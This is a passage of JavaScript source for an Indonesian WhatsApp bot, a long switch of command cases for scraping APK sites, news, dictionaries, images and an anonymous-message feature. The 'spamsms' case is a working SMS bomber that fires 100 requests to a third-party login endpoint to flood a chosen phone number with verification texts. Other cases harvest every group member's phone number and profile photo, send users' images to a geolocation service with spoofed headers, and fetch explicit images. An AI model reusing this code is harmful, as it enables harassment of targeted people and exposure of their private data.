 m.reply('Resep tidak ditemukan.');
 }
 } catch (error) {
 m.reply(error);
 }
 }

 const query = text.trim(); // Mengambil input pengguna dari variabel text
 getResep(query);
}
break
case 'apk': {
if (!isPrem) return replyprem(mess.premium)
const fetch = require('node-fetch');
const cheerio = require('cheerio');

 if (!text) throw 'Masukkan nama aplikasi yang ingin dicari.';

 async function fetchSearchResults(query) {
 try {
 const url = 'https://apkfab.com/search?q=' + encodeURIComponent(query);
 const response = await fetch(url);
 if (!response.ok) throw new Error('Gagal mengambil data pencarian.');
 const body = await response.text();
 const $ = cheerio.load(body);

 const results = $('.list-template.lists .list').map((index, element) => {
 return {
 title: $(element).find('.title').text().trim(),
 link: $(element).find('a').attr('href'),
 image: $(element).find('.icon img').attr('data-src'),
 rating: $(element).find('.other .rating').text().trim(),
 review: $(element).find('.other .review').text().trim(),
 };
 }).get();

 return results;
 } catch (error) {
 console.error('Error fetching search results:', error);
 return [];
 }
 }

 async function fetchDownloadDetails(url) {
 try {
 const response = await fetch(url.endsWith('/download') ? url : url + '/download');
 if (!response.ok) throw new Error('Gagal mengambil detail unduhan.');
 const body = await response.text();
 const $ = cheerio.load(body);

 const title = $('.download_button_box a.down_btn').attr('title');
 const link = $('.download_button_box a.down_btn').attr('href');
 return { title, link };
 } catch (error) {
 console.error('Error fetching download details:', error);
 }
 }

 try {
 const searchResults = await fetchSearchResults(text);
 if (searchResults.length === 0) {
 m.reply('Aplikasi tidak ditemukan.');
 return;
 }

 const appDetailUrl = searchResults[0].link;
 const appDetails = await fetchDownloadDetails(appDetailUrl);

 if (!appDetails || !appDetails.link) {
 m.reply('Link download tidak ditemukan.'); 
 return;
 }

 m.reply(`Menyiapkan unduhan untuk ${appDetails.title}\n\nMohon tunggu sekitar 1-10 menit...`);

 const downloadResponse = await fetch(appDetails.link);
 if (!downloadResponse.ok) throw new Error('Gagal mengunduh APK.');

 // Kirim file sebagai lampiran langsung dari stream
 sky.sendMessage(m.chat, {
 document: {
 url: appDetails.link,
 data: downloadResponse.body,
 },
 mimetype: 'application/vnd.android.package-archive',
 fileName: `${appDetails.title}.apk`
 });

 } catch (error) {
 m.reply('Terjadi kesalahan: ' + error.message);
 }
}
break
case 'getallppmember': {
 try {
 // Fungsi untuk mendapatkan foto profil
 async function getPp(sky, target) {
 let anu = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return anu.content[0];
 }

 if (!m.isGroup) {
 return m.reply('Perintah ini hanya bisa digunakan di dalam grup.');
 }

 // Mendapatkan metadata grup
 const groupMetadata = await sky.groupMetadata(m.chat);
 const participants = groupMetadata.participants;

 // Inisialisasi variabel untuk menyimpan nomor telepon
 let phoneNumbers = [];

 // Looping melalui semua anggota
 participants.forEach(participant => {
 const phoneNumber = participant.id.split('@')[0].replace('+62', '0');
 if (phoneNumber.length > 8 && !isNaN(phoneNumber)) {
 phoneNumbers.push(phoneNumber);
 }
 });

 if (phoneNumbers.length === 0) {
 return m.reply('Tidak ada nomor telepon yang ditemukan di grup ini.');
 }

 // Ambil dan kirim foto profil untuk setiap nomor
 for (const number of phoneNumbers) {
 let who = number + "@s.whatsapp.net";
 let onWhatsapp = await sky.onWhatsApp(who);
 let profileData = onWhatsapp.find(item => item.exists);

 if (profileData) {
 let profileJid = profileData.jid;
 let _data = await getPp(sky, profileJid).catch(_ => null);

 if (_data) {
 let _data_url = _data?.attrs?.url || "https://telegra.ph/file/0b113db9d9e244ea22c81.jpg";
 let _data_caption = `Foto profil untuk nomor ${number}`;
 await sky.sendFile(m.chat, _data_url, `pp_${number}.jpg`, _data_caption, m);
 }
 }
 }

 } catch (error) {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat memproses permintaan.');
 }
}
break
case 'antiviewonce': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === 'on') {
        db.data.chats[m.chat].antiviewonce = true;
        m.reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].antiviewonce = false;
        m.reply(`${command} is disabled`);
    } else {
        m.reply(`_contoh antiviewonce on_`);
    }
}
break;
case 'antipoll': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === 'on') {
        db.data.chats[m.chat].antipoll = true;
        m.reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].antipoll = false;
        m.reply(`${command} is disabled`);
    } else {
        m.reply(`_contoh antipoll on_`);
    }
}
break
case 'antichat': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === 'on') {
        db.data.chats[m.chat].antichat = true;
        m.reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].antichat = false;
        m.reply(`${command} is disabled`);
    } else {
        m.reply(`_contoh antichat on_`);
    }
}
break
case 'antimedia': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === 'on') {
        db.data.chats[m.chat].antimedia = true;
        m.reply(`${command} is enabled\n\n> Video\n> Audio\n> Image`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].antimedia = false;
        m.reply(`${command} is disabled`);
    } else {
        m.reply(`_contoh antimedia on_`);
    }
}
break
case 'antievent': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === 'on') {
        db.data.chats[m.chat].antievent = true;
        m.reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].antievent = false;
        m.reply(`${command} is disabled`);
    } else {
        m.reply(`_contoh antievent on_`);
    }
}
break
case 'anticallog': {
    if (!m.isGroup) return m.reply('gc doang.');
    if (!isBotAdmins) return m.reply('adminin botnya.');

    if (args[0] === 'on') {
        db.data.chats[m.chat].anticallog = true;
        m.reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].anticallog = false;
        m.reply(`${command} is disabled`);
    } else {
        m.reply(`_contoh anticallog on_`);
    }
}
break
case 'call': {
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

// Buat instance client
const client = new Client({
 authStrategy: new LocalAuth()
});

// Event ketika client siap
client.on('ready', () => {
 console.log('Client is ready!');
});

// Event ketika menerima pesan
client.on('message', async message => {
 const text = message.body.toLowerCase();

 if (text.startsWith('call ')) {
 const targetNumber = text.replace('call ', '').trim();
 
 if (!targetNumber) {
 await message.reply('Mohon berikan nomor yang ingin dihubungi.');
 return;
 }

 const callMessage = `Memanggil nomor ${targetNumber}...`;
 await message.reply(callMessage);

 // Fungsi untuk memulai panggilan
 initiateCall(targetNumber);
 }
});

// Fungsi untuk memulai panggilan - implementasi sesuai platform
function initiateCall(number) {
 // Di sini kita hanya mencetak nomor untuk demonstrasi
 console.log(`Panggilan dilakukan ke nomor: ${number}`);

 // Jika platform atau API mendukung panggilan, gunakan API tersebut di sini
 // Misalnya, menggunakan API telephony atau library lain
}

// Event untuk menampilkan QR code
client.on('qr', qr => {
 qrcode.generate(qr, { small: true });
});

// Inisialisasi client
client.initialize();
}
break
case 'rule34': {
 async function rule34Handler({ command, args }) {
 if (command !== "rule34") return;

 if (!args[0]) {
 m.reply('_cari yang mana_.');
 return;
 }
 const tag = args[0];
 const url = `https://rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&tags=${tag}`;
 try {
 const response = await fetch(url);
 const data = await response.json();
 if (!data || data.length === 0) {
 m.reply(`Tidak ada hasil *${tag}*`);
 return;
 }
 const randomIndex = Math.floor(Math.random() * data.length);
 const randomImage = data[randomIndex];
 const imageUrl = randomImage.file_url;
 const sourceLink = `https://rule34.xxx/index.php?page=post&s=view&id=${randomImage.id}`;
 await sky.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `> ${tag}\n\n> ${sourceLink}`,
 mentions: [m.sender] 
 });
 } catch (error) {
 console.error(error);
 m.reply('✧ Terjadi kesalahan yang tidak terduga.');
 }
 }
 rule34Handler({ command, args });
}
break


case 'clearallgrup': {
 try {
 // Mendapatkan semua chat IDs yang sesuai dengan pola grup
 const chatIdsToDelete = Object.values(sky.chats)
 .filter(item => /@g\.us$/.test(item.id))
 .map(item => item.id);

 // Hapus setiap grup
 const deletedGroupCount = chatIdsToDelete.length;
 for (const id of chatIdsToDelete) {
 // Mendapatkan JID dari chat ID
 const decodedJid = (0, WABinary_1.jidDecode)(id);
 
 // Menangani kasus jika decodedJid adalah undefined atau null
 if (decodedJid && decodedJid.user) {
 const { user } = decodedJid;
 // Lakukan proses penghapusan grup
 await sky.chatModify(
 { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
 id
 );
 } else {
 console.error(`Decoded JID is invalid or missing 'user' for ID: ${id}`);
 }
 }

 // Kirim balasan ke pengguna
 await m.reply(m.chat, `*Jumlah grup yang dihapus:* ${deletedGroupCount}`, m);
 } catch (error) {
 console.error('Terjadi kesalahan:', error);
 await m.reply(m.chat, 'Terjadi kesalahan dalam menghapus grup.', m);
 }
}
break
case 'lokasi': {
 let [place] = text.split('|');
 if (!place) throw 'lokasi nama_tempat';

 const geocodeUrl = `https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(place)}&format=json&addressdetails=1`;

 try {
 // Mengambil data geocoding dari Nominatim
 const response = await axios.get(geocodeUrl);
 const data = response.data;

 // Memeriksa apakah hasil geocoding berhasil
 if (data.length > 0) {
 const location = data[0];
 const { lat: degreesLatitude, lon: degreesLongitude } = location;

 // Mengirimkan lokasi menggunakan sky.sendMessage
 await sky.sendMessage(m.chat, {
 location: {
 degreesLatitude,
 degreesLongitude
 }
 }, { quoted: m });
 } else {
 m.reply('Gagal mendapatkan koordinat. Pastikan nama tempat valid dan coba lagi.');
 }
 } catch (error) {
 m.reply('Gagal mendapatkan koordinat. Pastikan nama tempat valid dan coba lagi.');
 }
}
break
case 'imageinfo': {
 // Periksa apakah ada pesan yang di-quote dan mime type-nya adalah gambar
 if (quoted && /image/.test(quoted.mimetype)) {
 try {
 // Unduh gambar dari pesan yang di-quote
 const imageBuffer = await quoted.download();

 // Buat FormData dan tambahkan gambar yang diunduh
 const formData = new FormData();
 // Menggunakan Buffer dari gambar
 formData.append('image', new Blob([imageBuffer], { type: quoted.mimetype }), 'image.jpg');

 // Kirim gambar ke server
 const response = await fetch('https://locate-image-7cs5mab6na-uc.a.run.app/', {
 method: 'POST',
 body: formData,
 headers: {
 origin: 'https://geospy.ai',
 referer: 'https://geospy.ai/',
 priority: 'u=1, i',
 },
 });

 // Periksa jika respons tidak ok
 if (!response.ok) {
 throw new Error(`HTTP error! Status: ${response.status}`);
 }

 // Ambil dan kirim respons dari server
 const json = await response.json();
 m.reply(`Informasi gambar: ${JSON.stringify(json)}`);
 } catch (error) {
 m.reply(`Terjadi kesalahan saat memproses gambar: ${error.message}`);
 }
 } else {
 m.reply("Tidak ada gambar yang ditemukan.");
 }
}
break
case 'spamsms': {
 if (!q) return m.reply(`Masukkan nomor`);
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return m.reply('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (Sms) By avosky`);
});
}
}
m.reply(`SMS/call spam will be sent to the target number`)
}
break
case 'detik': {
 m.reply('Mencari berita terkini...');

 try {
 const url = 'https://www.detik.com/terpopuler';
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);

 let berita = [];
 $('.grid-row article').each((index, element) => {
 if (index < 5) { // Ambil 5 berita teratas
 const judul = $(element).find('h3.media__title').text().trim();
 const link = $(element).find('a').attr('href');
 const waktu = $(element).find('.media__date').text().trim();
 berita.push({ judul, link, waktu });
 }
 });

 if (berita.length === 0) {
 throw new Error('Tidak ada berita yang ditemukan.');
 }

 let beritaText = 'Berita Terpopuler:\n\n';
 berita.forEach((item, index) => {
 beritaText += `${index + 1}. ${item.judul}\n`;
 beritaText += ` ${item.waktu}\n`;
 beritaText += ` ${item.link}\n\n`;
 });

 m.reply(beritaText);
 } catch (error) {
 m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
 }
}
 break
 // MENF
case 'menfess': {
 var mona = args.join(' ');
 var m1 = mona.split("|")[0];
 let mq1 = m1 + '@s.whatsapp.net';
 this.menfes = this.menfes ? this.menfes : {};
 let roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
 if (roof) return m.reply("Kamu masih berada dalam sesi menfess");
 if (m.isGroup) return m.reply('Terjadi Kesalahan Fitur Khusus Private message');
 if (!mona.includes('|')) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6283870640443|Aku sayang kamu\n`);
 let [namaNya, nomorNya, pesanNya] = mona.split`|`;
 if (nomorNya.startsWith('0')) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|62895328123417|Aku sayang kamu\n`);
 if (isNaN(nomorNya)) return m.reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|62895328123417|Aku sayang kamu\n`);
 var yoi = `Halo 😉, ada kiriman menfess nih\n\nPengirim : ${namaNya}\nPesan : ${pesanNya}\n\n*Gunakan Fitur Ini Untuk :*\n.terimamenfess (menerima menfes)\n.tolakmenfess (menolak menfess)\n.stopmenfess (berhenti dari sesi menfess)\n\n_Pesan ini ditulis oleh seseorang, bot hanya menyampaikan saja_\n\n_Jika Kamu Ingin Membalas Pesannya Kamu Harus Mengetik terimamenfess_`;
 let tod = await getBuffer('https://pomf2.lain.la/f/7j4qatgk.jpg');
 let id = m.sender;
 this.menfes[id] = {
 id,
 a: m.sender,
 b: nomorNya + "@s.whatsapp.net",
 state: 'WAITING'
 };
 await sky.sendMessage(nomorNya + '@s.whatsapp.net', { image: tod, caption: yoi });
 m.reply(`_Sukses Pesan Telah Dikirim Ke Nomer Tujuan_`);
}
break
case 'tolakmenfess': {
    roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
    if (!roof) return m.reply("Belum ada sesi menfess");
    let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
    let other = [room.a, room.b].find(user => user !== m.sender);
    find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING');
    sky.sendMessage(other, { text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender] });
    m.reply("Menfess berhasil ditolak ");
    delete this.menfes[roof.id];
}
break;
case 'terimamenfess': {
 sky.sendMessage(m.chat, { text: "Processed By Sistem Menfess\n\nSilahkan Ketik\n!balas (pesannya)" }, { quoted: fkontak });
 let roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
 if (!roof) return m.reply("Belum ada sesi menfess");
 let find = Object.values(this.menfes).find(menpes => menpes.state == 'WAITING');
 if (!find) return m.reply("Belum ada menfess yang menunggu konfirmasi");
 let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
 let other = [room.a, room.b].find(user => user !== m.sender);
 find.b = m.sender;
 find.state = 'CHATTING';
 this.menfes[find.id] = { ...find };
 sky.sendMessage(other, { text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini dengan cara \n!balas (pesannya) contoh _!balas siapa_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, mentions: [m.sender] });
 sky.sendMessage(m.chat, { text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini dengan cara \n_!balas (pesannya) contoh !balas siapa_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess` });
}
break
case 'balas': {
 let me = m.sender
 let chatId = m.chat;
 let find = Object.values(this.menfes).find(menpes => menpes.state == 'CHATTING' && [menpes.a, menpes.b].includes(m.sender));
 if (!find) return m.reply("Kamu tidak sedang dalam sesi chat menfess\n\n_harap mengetik terimamenfess terlebih dahulu baru mengetik .balas_");
 let other = [find.a, find.b].find(user => user !== m.sender);
 sky.sendMessage(other, { 
text: `${q}`,
contextInfo:{
forwardingScore: 10,
isForwarded: true, 
mentionedJid:[me],
}
})
 sky.sendMessage(chatId, { text: "Pesan telah terkirim ke penerima menfess" });
}
break
case 'kbbikemdikbud': {
 if (!text) return m.reply('Format: kamus <kata>')
 const axios = require('axios')
 const cheerio = require('cheerio') 
 const url = `https://kbbi.kemdikbud.go.id/entri/${encodeURIComponent(text)}` 
 axios.get(url).then(response => {
 const $ = cheerio.load(response.data)
 let definitions = [] 
 $('ol li').each((i, elem) => {
 definitions.push($(elem).text().trim())
 }) 
 if (definitions.length === 0) {
 return m.reply('Kata tidak ditemukan dalam KBBI.')
 } 
 let result = `Definisi dari *${text}*:\n`
 definitions.forEach((def, index) => {
 result += `${index + 1}. ${def}\n`
 }) 
 sky.sendMessage(m.chat, { text: result }, { quoted: m })
 }).catch(error => {
 m.reply('Terjadi kesalahan saat mencari definisi kata.')
 })
}
break
case 'wikipedias': {
 if (!text) {
 throw `Mohon masukkan kata kunci topik yang ingin Anda cari informasinya.\n\nContoh: Wikipedia Teknologi Informasi`;
 }

 m.reply('Mencari artikel Wikipedia...');

 try {
 const url = `https://id.wikipedia.org/wiki/${encodeURIComponent(text)}`;
 const response = await axios.get(url, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 }
 });
 const $ = cheerio.load(response.data);

 const judul = $('#firstHeading').text().trim();
 const konten = $('#mw-content-text > div.mw-parser-output').find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');

 if (!konten) {
 throw new Error('Tidak ada artikel yang ditemukan untuk kata kunci tersebut.');
 }

 const artikel = `Judul: ${judul}\n\n${konten}`;
 m.reply(artikel);
 } catch (error) {
 m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
 }
}
break
case 'vurl': {
 if (!text) throw `Berikan link yang ingin dipendekkan`
 const longUrl = encodeURIComponent(text);

 axios.get(`https://vurl.com/api.php?url=${longUrl}`)
 .then(response => {
 const shortUrl = response.data.trim();
 m.reply(`URL pendek: ${shortUrl}`);
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat memendekkan URL.');
 });
}
break
case 'quotemaker': {
 if (!q) return m.reply(`contoh quotemaker avosky | sad banget anjir`);
kyy = text.split(' | ')[0] ? text.split(' | ')[0] : '-'
ky = text.split(' | ')[1] ? text.split(' | ')[1] : '-'

 const fetch = require('node-fetch');

 async function createQuote(author, message) {
 try {
 const host = "https://quozio.com/";

 const quoteResponse = await fetch(`${host}api/v1/quotes`, {
 method: "POST",
 headers: {
 "Content-Type": "application/json"
 },
 body: JSON.stringify({
 author: author,
 quote: message
 })
 });
 const { quoteId } = await quoteResponse.json();

 const templatesResponse = await fetch(`${host}api/v1/templates`);
 const templatesData = await templatesResponse.json();
 const templates = templatesData.data;

 const template = templates[Math.floor(Math.random() * templates.length)];

 const imageUrlResponse = await fetch(`${host}api/v1/quotes/${quoteId}/imageUrls?templateId=${template.templateId}`);
 const imageUrlData = await imageUrlResponse.json();
 const imageUrl = imageUrlData.medium;

 return imageUrl;
 } catch (err) {
 console.error("Error creating quote:", err);
 throw err;
 }
 }
 const author = `${kyy}`
 const message = `${ky}`

 createQuote(author, message)
 .then(imageUrl => {
 sky.sendMessage(m.chat, { image: { url: imageUrl } }, { caption: `Quote by ${author}` });
 })
 .catch(err => {
 m.reply("Maaf, terjadi kesalahan dalam membuat quote.");
 });
}
break
case 'picsum': {
 if (!q) return m.reply(`contoh \n\npicsum nature`);
 
 async function textToImage(text) {
 try {
 const imageUrl = `https://picsum.photos/seed/${encodeURIComponent(text)}/800/600`;
 return imageUrl;
 } catch (err) {
 return null;
 }
 }

 const result = await textToImage(q);
 if (result) {
 const message = {
 image: { url: result },
 caption: 'done nih'
 };
 sky.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break
case 'robomaker': { 
 if (!q) return m.reply(`contoh \nRobomaker Avosky\n\n! Ini Bukan Membuat Robot Tapi menghasilkan robot dari nama doang`);
 async function roboMaker(text) {
 try {
 const imageUrl = `https://robohash.org/${q}`;
 return imageUrl;
 } catch (err) {
 return null;
 }
 }
//avosky
 const result = await roboMaker(q);
 if (result) {
 const message = {
 image: { url: result },
 caption: 'Random Robot'
 };
 sky.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break
case 'remini': case 'hd': case 'hdr': {
 if (!isPrem) return replyprem(mess.premium)
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || q.mediaType || "";

 if (!mime) throw `Fotonya Mana Kak?`;
 if (!/image\/(jpe?g|png)/.test(mime)) throw `Mime ${mime} tidak support`;

 // Memeriksa parameter tambahan setelah perintah
 let args = m.text.split(' ');
 let iterations = 1; // Default ke 1 jika tidak ada parameter

 if (args.length > 1) {
 let param = args[1];
 if (/^\d+x$/.test(param)) {
 iterations = parseInt(param) || 1;
 } else {
 throw `Parameter tidak valid. Gunakan format seperti '2x' untuk iterasi.`;
 }
 }

 m.reply('bntr ya ka');

 let img = await q.download?.();
 let error;

 try {
 // Proses gambar sesuai dengan jumlah iterasi
 let processedImg = img;
 for (let i = 0; i < iterations; i++) {
 processedImg = await processing(processedImg, "enhance");
 }

 // Kirim gambar hasil proses
 sky.sendMessage(m.chat, { image: processedImg, caption: `Succeed after ${iterations} iterations` }, { quoted: m });
 } catch (er) {
 error = true;
 m.reply("Proses Gagal :(");
 }
}
break







case 'freeaimage': {
 if (!q) return m.reply(`contoh \n\nfreeaimage generate prompt`);

 const cheerio = require('cheerio');
 const axios = require('axios');

 async function scrapeImage(prompt) {
 try {
 const { data } = await axios.get(`https://freeaimage.com/?prompt=${encodeURIComponent(prompt)}`);
 const $ = cheerio.load(data);
 const imageUrl = $('img.generated-image').attr('src'); // Selector ini hanya contoh, perlu disesuaikan dengan struktur HTML dari web
 return imageUrl ? `https://freeaimage.com${imageUrl}` : null;
 } catch (err) {
 return null;
 }
 }

 const imageUrl = await scrapeImage(q);
 if (imageUrl) {
 const message = {
 image: { url: imageUrl },
 caption: 'Image generated successfully!'
 };
 sky.sendMessage(m.chat, message);
 } else {
 m.reply('Failed to generate image.');
 }
}
break
case 'yyy': {
const ytdl = require("node-yt-dl");

 const query = m.text.slice(8).trim(); // Mengambil query dari pesan

 if (!query) {
 m.reply("Silakan berikan kata kunci untuk pencarian YouTube.");
 }

 (async () => {
 try {
 const result = await ytdl.search(query);
 const firstResult = result[0]; // Ambil hasil pertama

 if (firstResult) {
 const videoTitle = firstResult.title;
 const videoUrl = firstResult.url;
 const message = `Judul: ${videoTitle}\nURL: ${videoUrl}`;
 m.reply(message);
 } else {
 m.reply("Tidak ada hasil ditemukan.");
 }
 } catch (error) {
 m.reply("Terjadi kesalahan saat mencari video.");
 console.error(error);
 }
 })();
}
break
case 'themovie': {
 if (!text) {
 throw 'Contoh: themovie horror';
 }
// wm avs
 m.reply('_sabar tuan sedang mencari film nya_');
// wm avs
 async function avzz(query) {
 const url = `https://www.themoviedb.org/search?query=${query}`;
 try {
 const response = await axios.get(url);
 const html = response.data;
 const $ = cheerio.load(html);
 const movies = [];
// wm avs
 $('.card').each((index, element) => {
 const title = $(element).find('.title a').text().trim();
 const link = `https://www.themoviedb.org${$(element).find('.title a').attr('href')}`;
 const synopsis = $(element).find('.overview').text().trim();
 movies.push({ title, link, synopsis });
 });
// wm avs
 return movies;
 } catch (error) {
 console.error('error di sini:', error);
 return [];
 }
 }
// wm avs
 try {
 const query = encodeURIComponent(text);
 const movies = await avzz(query);

 if (movies.length === 0) {
 throw new Error('Film tidak ditemukan.');
 }
// wm avs
 let result = '';
 movies.forEach((movie, index) => {
 result += `*${index + 1}. ${movie.title}*\nLink: ${movie.link}\nSinopsis: ${movie.synopsis}\n\n`;
 });
// wm avs
 m.reply(result);
 } catch (error) {
 m.reply(`terjadi kesalahan: ${error.message}`);
 }
}
break
case 'bughunter':
 if (!text) throw 'Gunakan: *bughunter [URL situs web]*';
 const websiteUrl = args[0];
 try {
 const bugHuntingReport = await performAdvancedBugHunting(websiteUrl);
 m.reply(bugHuntingReport);
 } catch (error) {
 m.reply(error);
 }
break
case 'quote2': {
 try {
 if (!q) return m.reply(`Contoh: ${prefix + command} "Teks yang ingin Anda buat gambar"`);

 const { createCanvas, loadImage } = require('canvas');
 const fs = require('fs');
 const path = require('path');

 const canvasWidth = 800;
 const canvasHeight = 400;
 const canvas = createCanvas(canvasWidth, canvasHeight);
 const ctx = canvas.getContext('2d');

 // Background color
 ctx.fillStyle = '#ffffff';
 ctx.fillRect(0, 0, canvasWidth, canvasHeight);

 // Text settings
 ctx.fillStyle = '#000000';
 ctx.font = 'bold 32px Arial';
 ctx.textAlign = 'center';
 ctx.textBaseline = 'middle';

 // Splitting text into multiple lines if too long
 const words = q.split(' ');
 const lines = [];
 let currentLine = '';
 
 words.forEach(word => {
 const testLine = currentLine + word + ' ';
 const testWidth = ctx.measureText(testLine).width;
 if (testWidth > canvasWidth - 40) {
 lines.push(currentLine);
 currentLine = word + ' ';
 } else {
 currentLine = testLine;
 }
 });
 lines.push(currentLine);

 const lineHeight = 40;
 const textY = (canvasHeight - (lines.length * lineHeight)) / 2;

 lines.forEach((line, index) => {
 ctx.fillText(line.trim(), canvasWidth / 2, textY + (index * lineHeight));
 });

 const outputPath = path.join(__dirname, 'quote.png');
 const out = fs.createWriteStream(outputPath);
 const stream = canvas.createPNGStream();
 stream.pipe(out);

 out.on('finish', async () => {
 await sky.sendMessage(from, { image: { url: outputPath }, caption: 'Berikut adalah gambar dengan kutipan Anda.', fileName: 'quote.png' }, { quoted: m });
 fs.unlinkSync(outputPath); // Menghapus file setelah dikirim
 });

 } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan dalam memproses permintaan Anda.');
 }
}
break
case 'brainly': {
 try {
 if (!text) return m.reply(`Contoh: ${prefix + command} pertanyaan`);
 m.reply(mess.wait);

 // Mengirim permintaan ke Brainly
 axios.get(`https://brainly.com/app/ask?q=${encodeURIComponent(text)}`)
 .then(response => {
 const $ = cheerio.load(response.data);
 let answers = [];

 // Menyaring jawaban dari halaman
 $('.sg-text').each((i, elem) => {
 answers.push($(elem).text());
 });

 if (answers.length > 0) {
 m.reply(`Jawaban untuk pertanyaan "${text}":\n\n${answers.join('\n\n')}`);
 } else {
 m.reply('Maaf, tidak ada jawaban yang ditemukan.');
 }
 })
 .catch(err => {
 console.error(err);
 m.reply('Terjadi kesalahan saat mencari jawaban.');
 });
 } catch (err) {
 console.error(err);
